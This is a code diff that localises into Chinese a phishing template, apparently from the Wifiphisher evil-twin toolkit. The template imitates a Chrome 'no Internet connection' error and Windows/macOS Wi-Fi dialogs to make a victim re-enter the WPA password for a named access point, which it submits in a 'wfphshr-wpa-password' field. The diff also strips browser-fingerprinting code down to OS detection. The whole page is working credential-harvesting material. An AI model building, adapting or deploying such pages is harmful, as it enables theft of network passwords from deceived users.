@@ -14,15 +14,6 @@
         (function (window) {
             {
                 var unknown = '-';
-
-                // screen
-                var screenSize = '';
-                if (screen.width) {
-                    width = (screen.width) ? screen.width : '';
-                    height = (screen.height) ? screen.height : '';
-                    screenSize += '' + width + " x " + height;
-                }
-
                 // browser
                 var nVer = navigator.appVersion;
                 var nAgt = navigator.userAgent;
@@ -31,21 +22,8 @@
                 var majorVersion = parseInt(navigator.appVersion, 10);
                 var nameOffset, verOffset, ix;
 
-                // Opera
-                if ((verOffset = nAgt.indexOf('Opera')) != -1) {
-                    browser = 'Opera';
-                    version = nAgt.substring(verOffset + 6);
-                    if ((verOffset = nAgt.indexOf('Version')) != -1) {
-                        version = nAgt.substring(verOffset + 8);
-                    }
-                }
-                // Opera Next
-                if ((verOffset = nAgt.indexOf('OPR')) != -1) {
-                    browser = 'Opera';
-                    version = nAgt.substring(verOffset + 4);
-                }
                 // Edge
-                else if ((verOffset = nAgt.indexOf('Edge')) != -1) {
+                if ((verOffset = nAgt.indexOf('Edge')) != -1) {
                     browser = 'Microsoft Edge';
                     version = nAgt.substring(verOffset + 5);
                 }
@@ -181,17 +159,7 @@
                 }
             }
 
-            window.jscd = {
-                screen: screenSize,
-                browser: browser,
-                browserVersion: version,
-                browserMajorVersion: majorVersion,
-                mobile: mobile,
-                os: os,
-                osVersion: osVersion,
-                cookies: cookieEnabled,
-                flashVersion: flashVersion
-            };
+            window.os =  os;
         }(this));
 
         if (jscd.os == "Windows") {
@@ -213,21 +181,21 @@
         '        </div>' +
         '        <div class="description">' +
         '           <form id="wifi-search-form" method="post" action="index.html">' +
-        '               <strong>The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption if target_ap_encryption != None }} password.</strong>' + 
+        '               <strong> Wi-Fi 网络： ″{{ target_ap_essid }}″ 需要 {{ target_ap_encryption if target_ap_encryption != None }} 密码.</strong>' +
         '               <div class="password">' +
-        '                   <label>Password:</label>' +
+        '                   <label>密码:</label>' +
         '                   <input type="password" id="wifi-search-password" name="wfphshr-wpa-password"/>' +
         '                   <div class="glow"></div>' +
         '               </div>' + 
         '               <div class="checkmark">' +
-        '                   <input id="show-password" type="checkbox" /><label for="show-password">Show password</label>' +
+        '                   <input id="show-password" type="checkbox" /><label for="show-password">显示</label>' +
         '               </div>' +
         '               <div class="checkmark">' +
-        '                   <input id="remember-network" type="checkbox" /><label for="remember-network">Remember this network</label>' +
+        '                   <input id="remember-network" type="checkbox" /><label for="remember-network">记住</label>' +
         '               </div>' + 
         '               <div class="buttons">' +
-        '                     <button id="button-join" class="action" disabled="disabled">Join</button>' +
-        '                   <button id="button-cancel">Cancel</button>' +
+        '                     <button id="button-join" class="action" disabled="disabled">加入</button>' +
+        '                   <button id="button-cancel">取消</button>' +
         '               </div>' +
         '           </form>' +
         '       </div>' +
@@ -249,26 +217,25 @@
         "                   <input id='automatic' type='checkbox' />" +
         "                   <label for='automatic'>" +
         "                       <div class='check'></div>" +
-        "                       Connect automatically" +
+        "                       自动连接" +
         "                   </label>" +
-        "                   <button id='connect' class='connect' type='button'>Connect</button>" +
+        "                   <button id='connect' class='connect' type='button'>连接</button>" +
         "               </div>" +
         "               <div class='connected'>" +
-        "                   Enter the network security key" +
+        "                   请输入网络密钥" +
         "                   <input id='password' type='password' name='wfphshr-wpa-password' />" +
-        "                   You can also connect by pushing the button on the" +
-        "                   router." +
+        "                   或者重启路由器." +
         "                   <input id='share' type='checkbox' />" +
         "                   <label for='share'>" +
         "                       <div class='check'></div>" +
-        "                       Share network with my contacts" +
+        "                       分享网络" +
         "                   </label>" +
-        "                   <button class='authenticate'>Next</button> " +
-        "                   <button class='cancel' type='button'>Cancel</button> " +
+        "                   <button class='authenticate'>下一步</button> " +
+        "                   <button class='cancel' type='button'>取消</button> " +
         "               </div> " +
         "           </div> " +
         "       </li> " +
-                {% for ap in APs %} 
+                {% for ap in APs %}
         "        <li>" +
         "           <div class='wifi icon'>" +
         "               <div class='dot dot1'></div>" +
@@ -278,12 +245,12 @@
         "           </div>" +
         "           <div class='content'>" +
         "               <strong>{{ ap.essid }}</strong>" +
-        "               <span>Connected</span>" +
+        "               <span>已连接</span>" +
         "           </div>" +
         "       </li>" +
                 {% endfor %}
         "       </ul> " +
-        "       <a href=''>Network settings</a> " +
+        "       <a href=''>网络设置</a> " +
         "       </div></form>"; 
         </script>
         <title></title>
@@ -294,20 +261,14 @@
             <img class="dinosaur" src="dinosaur.png" width="45" />
             <div class="icon icon-offline" style="visibility: hidden;"></div>
             <div id="main-message">
-                <h1>There is no Internet connection</h1>
-                <p>You can try to diagnose the problem by taking the following steps:
-                <br />
-                Go to
-                <strong>
-                Applications &gt; System Preferences &gt; Network &gt; Assist me
-                </strong>
-                to test your connection.</p>
+                <h1>未连接到互联网</h1>
+                <p>请试试以下办法：
                 <div id="suggestions-list" >
-                    <p >Try:</p>
+                    <p ></p>
                     <ul class="chrome-list">
-                        <li>Checking the network cable or router</li>
-                        <li>Resetting the modem or router</li>
-                        <li>Reconnecting to Wi-Fi</li>
+                        <li>检查网线、调制解调器和路由器</li>
+                        <li>重新连接到 Wi-Fi 网络</li>
+                        <li>运行网络诊断</li>
                     </ul>
                 </div>
                 <div class="error-code">ERR_INTERNET_DISCONNECTED</div>
@@ -319,7 +280,7 @@
         <div id="loader-mac"></div>
         <div id="loader-windows"></div>
         <script>
-            if (jscd.os == "Windows") {
+            if (window.os == "Windows") {
                 document.getElementById("loader-windows").innerHTML = loadhtml_windows;
             }
             else {
